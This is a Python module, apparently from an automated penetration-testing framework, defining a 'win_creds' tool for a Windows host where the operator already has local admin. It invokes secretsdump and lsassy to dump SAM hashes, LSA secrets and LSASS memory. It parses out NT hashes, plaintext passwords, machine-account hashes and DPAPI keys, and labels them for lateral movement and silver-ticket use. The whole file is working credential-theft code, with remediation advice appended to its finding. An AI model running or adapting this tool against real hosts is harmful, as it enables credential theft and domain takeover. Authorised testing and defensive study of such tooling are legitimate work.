# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Live-host credential harvest (post-foothold).

Once you own a host (local admin — ``Pwn3d!``), this pulls every credential the
box holds, beyond a remote NTDS/DCSync:

  * **SAM** — local account NT hashes (``nxc --sam``),
  * **LSA secrets** — cached domain logons, service-account and autologon
    passwords, and the machine account (``nxc --lsa``),
  * **LSASS** — logged-on users' plaintext passwords / NT hashes and Kerberos
    material, via ``lsassy`` (no mimikatz on disk).

Each recovered secret becomes a credential in the Findings view (feeding reuse /
lateral movement), machine accounts + DPAPI keys are surfaced as loot, and a
single finding records the memory/registry credential theft. Native — parses at
the Autopwn level. Needs local admin on the target.
"""
from __future__ import annotations

import re
from typing import Any

from .macro import MacroTool, Results

_ANSI = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
_NXC_PREFIX = re.compile(r"(?im)^(?:SMB|WINRM|LDAP)\s+\S+\s+\d+\s+\S+\s+")
_NTLM = re.compile(r"^([^\s:]+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", re.M)
_EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"
_NEVER = {"guest", "defaultaccount", "wdagutilityaccount", "krbtgt"}
# lsassy prints "[+] DOMAIN\\user  <secret>" (secret = plaintext or lm:nt).
_LSASSY = re.compile(r"\[\+\]\s+(?:([^\\\s]+)\\)?([^\s\\]+)\s{2,}(\S+)")


class WinCredsTool(MacroTool):
    name = "win_creds"
    category = "credentials"
    host_param = "target"
    description = (
        "Harvest credentials from a host you have local admin on: local SAM hashes, "
        "LSA secrets (cached domain logons, service-account / autologon passwords, "
        "the machine account) and — via lsassy — logged-on credentials + Kerberos "
        "material from LSASS. Each becomes a recovered credential; needs Pwn3d!.")
    plan = [
        "Dump the local SAM (nxc --sam) — local account NT hashes",
        "Dump LSA secrets (nxc --lsa) — cached logons, service/autologon creds, machine acct",
        "Dump + parse LSASS with lsassy — logged-on plaintext/NT + Kerberos",
        "Report every recovered secret as a credential (+ loot + a finding)",
    ]
    parameters = {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "Host/IP you have local admin on."},
            "username": {"type": "string", "description": "Username."},
            "password": {"type": "string", "description": "Password."},
            "domain": {"type": "string", "description": "AD domain (optional; '.' for local)."},
            "hash": {"type": "string", "description": "NTLM hash for pass-the-hash (optional)."},
        },
        "required": ["target"],
    }

    def execute(self, R: Results, **kw: Any) -> None:
        host = kw["target"]
        dom = kw.get("domain", "")
        auth = {"username": kw.get("username", ""), "password": kw.get("password", ""),
                "domain": dom, "hash": kw.get("hash", "")}

        # SAM + LSA secrets (cached domain logons, service / autologon passwords,
        # the machine account, DPAPI) via impacket-secretsdump — its output is
        # captured reliably (NetExec's --sam/--lsa only write to a TTY). Against a
        # DC it replicates over DRSUAPI; against a member it reads the registry.
        self.log(f"[run] SAM + LSA secrets on {host} (secretsdump)")
        blob = self.sub("secretsdump", target=host, **auth)
        # LSASS-resident credentials (logged-on users) via lsassy, if installed.
        self.log(f"[run] LSASS via lsassy on {host}")
        lsass = self.sub("lsassy", target=host, **auth)

        # Strip any ANSI/CR so the regexes anchor cleanly.
        blob = _ANSI.sub("", (blob or "").replace("\r", ""))
        lsass = _ANSI.sub("", (lsass or "").replace("\r", ""))
        clean = _NXC_PREFIX.sub("", blob)
        recovered = 0
        machines: list[str] = []

        # ---- NTLM hashes from SAM + LSA (machine acct) -----------------------
        for m in _NTLM.finditer(clean):
            principal, nt = m.group(1), m.group(2)
            acct = principal.rpartition("\\")[2] or principal
            if nt == _EMPTY_NT:
                continue
            if acct.endswith("$"):
                machines.append(f"{acct}:{nt}")
                continue
            if acct.lower() in _NEVER:
                continue
            self.add_cred(acct, nt, dom, note="SAM/LSA (host)")
            recovered += 1

        # ---- LSASS creds (lsassy) -------------------------------------------
        for m in _LSASSY.finditer(lsass or ""):
            d, acct, secret = m.group(1) or dom, m.group(2), m.group(3)
            if acct.lower() in _NEVER or acct.endswith("$"):
                continue
            hm = re.match(r"[a-f0-9]{32}:([a-f0-9]{32})$", secret, re.I)
            secret = hm.group(1) if hm else secret
            if secret and secret != _EMPTY_NT:
                self.add_cred(acct, secret, d, note="LSASS (lsassy)")
                recovered += 1

        # ---- loot: machine accounts + DPAPI keys ----------------------------
        for ma in machines:
            self.add_loot(f"machine account hash: {ma}", "silver ticket / S4U material")
        for key in re.findall(r"dpapi_(?:machine|user)key:\s*(0x[0-9a-f]+)", clean, re.I):
            self.add_loot(f"DPAPI key {key[:22]}…", "decrypt DPAPI blobs (browser/creds)")

        if recovered or machines:
            self.add_finding(
                "Host Credentials Recovered from Memory/Registry (SAM / LSA / LSASS)",
                "High", cvss="8.1",
                description="With local admin on the host, SAM hashes, LSA secrets "
                "(cached domain logons, service-account / autologon passwords, the "
                "machine account) and/or LSASS-resident credentials were recovered — "
                "reusable for lateral movement and, where a privileged user is logged "
                "on, domain escalation.",
                recommendation="Enable LSA Protection (RunAsPPL) + Credential Guard, "
                "restrict local-admin reuse (LAPS), avoid interactive logons of "
                "privileged accounts on member hosts, and rotate exposed secrets.")
            self.log(f"  │ recovered {recovered} credential(s), {len(machines)} machine acct(s)")
        else:
            self.log("no credentials recovered — the account may lack local admin, "
                     "or the host's Remote Registry (SAM/LSA) and LSASS access are "
                     "unavailable/blocked.")
